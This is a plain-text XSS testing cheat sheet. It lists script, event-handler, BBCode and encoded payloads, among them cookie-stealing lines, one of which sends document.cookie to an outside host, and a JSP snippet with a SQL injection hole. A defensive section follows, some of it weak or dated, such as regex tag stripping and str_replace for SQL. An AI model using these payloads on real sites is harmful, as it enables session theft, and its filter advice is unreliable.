This file contains all popular XSS (Cross-Site Scripting) for testing

Some strings for testing field
<script>alert()</script>
"><script>alert()</script>
<script>alert("cookie: "+document.cookie)</script>
<sc<script>ript>alert()</sc</script>ript>
>>>><<script....
<BODY onLoad="alert('XSS')">
<IMG SRC="image.jpg" onError="alert('XSS')">


img dynsrc & lowsrc for forums, blogs, news boards, comments 
and other things with BBCode
[img]http://www.qwe.com/q.jpg dynsrc=javascript:alert()[/img]
[img]http://www.qwe.com/"/dynsrc="javascript:alert()"/q.jpg[/img]
[img]http://www.qwe.com/"/dynsrc=javascript:alert()/q.jpg[/img]
"httр://www.qwe.com/q.jpg" - can be changed to executable script

Coder decoder for xss
http://evuln.com/tools/xss-encoder/

<script language="JavaScript">
document.location.href="%68%74%74%70%3A%2F%2F%65%76%75%6C%6E%2E%63%6F%6D%2F%74%6F%6F%6C%73%2F%78%73%73%2D%65%6E%63%6F%64%65%72%2F"
</script>


Examples
<---------------->
Strored XSS (Persistent or Type-I XSS)

onmouseover
<b onmouseover=alert('Wufff!')>click me!</b>

onerror
<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>

Using Script Via Encoded URI Schemes
( a=&\#X41 (UTF-8) )
<IMG SRC=j&#X41vascript:alert('test2')>

<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">



<---------------->
Reflected XSS (Non-Persistent or Type-II XSS)

<%...
 Statement stmt = conn.createStatement();
 ResultSet rs = stmt.executeQuery("select * from users"+eid);
 if (rs != null) {
  rs.next();
  String name = rs.getString("query");
%>

Employee Name: <%= name %>

<---------------->
DOM XSS
http://www.some.site/page.html?default=<script>alert(document.cookie)</script>
http://www.some.site/somefile.pdf#somename=javascript:attackers_script_here


<---------------->
For GET query
http://site.ru/catalog?p=8
http://site.ru/catalog?p= "><script>alert("cookie: "+document.cookie)</script>

Img = new image()
Img.src = http://site.gif?+document.cookie;

[img]http://blabla.ru/1.jpg/dynsrc=javascript:alert()[/img]
[img]»»>«script>http://blabla.ru/1.jpg/dynsrc=javascript:alert()[/img]

How to protect
<---------------->
Check all input data for

“/?,#”>>>><<script{()}

htmlspecialchars()
htmlentities()
strip_tags()

reg expr
$v = preg_replace ( "'<script[^>]*?>.*?'si", "", $v );
str_replace($jsxss,"",$v);
it's for sql-injections
$v = str_replace (array("*","\\"), "", $v );
$v = mysql_real_escape_string( $v );

$v = htmlentities($v, ENT_QUOTES, «UTF-8»);
$v = htmlspecialchars($v, ENT_QUOTES);

use before all forms
<?php
header("Content-Type: text/html; charset=utf-8");
?>
<!DOCTYPE html>
<html>
 <head>
   <title>Сharset</title>
   <meta charset="utf-8">
 </head>

or in .htaccess
AddDefaultCharset UTF-8

"
If the tag is located before the tag and filled in with user data, 
an attacker can insert malicious HTML code in UTF-7 encoding, 
thus bypassing the filtering of characters such as < and ".
"

Setup flag HttpOnly in php.ini
session.cookie_httponly = True

in script
void session_set_cookie_params ( int $lifetime [, string $path [, string $domain [, bool $secure = false [, bool $httponly = true ]]]] )

at web-site
bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = true ]]]]]] )

use Content Security Policy (CSP) for example
Content-Security-Policy: default-src 'self';
 script-src trustedscripts.example.com
 style-src 'self' ajax.googleapis.com;
 connect-src 'self' https://api.myapp.com realtime.myapp.com:8080;
 media-src 'self' youtube.com;
 object-src media1.example.com media2.example.com *.cdn.example.com;
 frame-src 'self' youtube.com embed.ly

Content-Security-Policy - official header that uses all last versions of web browsers

Nessus, Nikto и OWASP Zed Attack Proxy - for checking web site xss-security
